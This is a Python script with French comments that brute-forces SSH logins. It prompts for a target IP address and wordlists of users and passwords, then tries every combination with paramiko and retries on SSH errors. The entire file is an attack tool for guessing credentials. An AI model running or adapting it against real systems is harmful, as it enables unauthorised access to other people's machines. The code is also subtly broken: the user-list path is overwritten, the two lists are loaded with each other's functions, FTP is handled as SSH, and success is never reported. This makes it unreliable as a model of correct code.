import os
import paramiko
import socket
import time

def brute_force_ssh(host, p, user, passwd):
    clt = paramiko.SSHClient()
    clt.load_system_host_keys()
    clt.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        print(f"Testing {user}:{passwd}")
        clt.connect(host, p, user, passwd, timeout=3)
    except socket.error as error:
        print("SocketError", error)
        return False
    except paramiko.AuthenticationException as exception:
        print ("AuthenticationException", exception)
        return False
    except paramiko.SSHException:
        print ("Try again")
        time.sleep(20)
        return brute_force_ssh(host, p, user, passwd)
    else:
        return True
def connection():
    adresse_IP = input ("Donner l'adresse IP: ") #adresse IP de la machine cible
    return adresse_IP

def get_port(service):
    try:
        return socket.getservbyname(service)
    except socket.error:
        return None

def choisir_protocole():
    while True:
        protocole = input ("Quel protocole voulez-vous choisir, SSH ou FTP? ").lower() #lower() va convertir la reponse en miniscules, sinon si l'utilisateur écrit le protocole en miniscule et non pas en majuscue on doit obtenir la phrase d'entrer un autre protocole 
        if protocole in ['ssh', 'ftp']:
           if protocole =='ssh':
               port = get_port('ssh')
           elif protocole == 'ftp':
               port = get_port('ftp')   
           return protocole, port
        else:
            print("Le protocole doit être SSH ou bien FTP, Veuillez réessayer")
def path_users_list():
    while True:
        path = input("Entrez le path du fichier de liste des utilisateurs : ")
        if os.path.isfile(path):
            return path
        else:
            print("Ce n'est pas un fichier valide.")

def acceder_users_list(path):
    try:
        with open(path, 'r', encoding="utf-8") as file:
            users = file.readlines()
            users = [user.strip() for user in users] # Supprimer les espaces vides et les sauts de ligne
            return users
    except FileNotFoundError:
        print("Fichier non trouvé")        
    except OSError:
        print("Fichier non accessible")
    except Exception as ex:
        print(f"L'erreur '{ex}' s'est produite")

def path_passwords_list():
    while True:
        path = input("Entrez le path du fichier: ")
        if os.path.isfile(path):
            return path
        else:
            print("Ce n'est pas un fichier valide.")

def acceder_password_file(path):
    try:
        with open(path, 'r', encoding="utf-8") as file:
             passwords = file.readlines()
    
             passwords = [password.strip() for password in passwords] # Supprimer les espaces vides et les sauts de ligne
             
             
             return passwords
    except FileNotFoundError:
        print("fichier non trouvé")        
    
    except OSError:
        print("fichier non accessible")

    except Exception as ex:
        print(f"L'erreur '{ex}' s'est produite")


def main():
    adresse_IP = connection()
    print("L'adresse IP est:", adresse_IP)
    

    protocole, port = choisir_protocole()
    print(f"Vous avez choisi le protocole {protocole} sur le port {port}")
    path = path_users_list()
    path = path_passwords_list()
    users = acceder_password_file(path)
    passwords = acceder_users_list(path)
    if users and passwords:
        for user in users:
            for password in passwords:
                if brute_force_ssh(adresse_IP, port, user, password):
                    return
        print("Aucun mot de passe trouvé.")
    else:
        print("Aucune liste de mots de passe ou d'utilisateurs récupérée.")
     
main()

    